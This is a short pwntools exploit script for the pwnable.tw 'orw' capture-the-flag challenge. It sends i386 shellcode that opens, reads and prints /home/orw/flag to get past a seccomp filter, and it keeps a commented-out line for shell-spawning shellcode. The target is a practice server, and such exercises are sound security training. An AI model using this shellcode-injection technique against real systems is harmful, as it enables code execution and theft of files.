from pwn import*
import argparse

context(arch='i386',os='linux')
context.terminal=['tmux','splitw','-h']
context.log_level = 'debug'
parser = argparse.ArgumentParser()
parser.add_argument('-r','--remote',action = 'store_true',help='-r -> remote')

args = parser.parse_args()

host = 'chall.pwnable.tw'
port = 10001

if args.remote:
    r = remote(host,port)
else:
    breakpoint = {'orw_seccomp':0x080484ce,'after_read':0x08048582,'before_read':0x0804857d}
    r = process('./orw')
    gdb.attach(r, 'b*{}'.format(breakpoint['orw_seccomp']))
    
elf = ELF('./orw')

#shellcode = asm(shellcraft.i386.linux.sh())

#shellcode = shellcraft.open('/home/orw/flag')
shellcode =  shellcraft.pushstr('/home/orw/flag')
shellcode += shellcraft.open('esp',0,0)
shellcode += shellcraft.read('eax','esp',100)
shellcode += shellcraft.write(1,'esp',100)

shellcode = asm(shellcode)

r.sendlineafter('shellcode:',shellcode)

r.interactive()
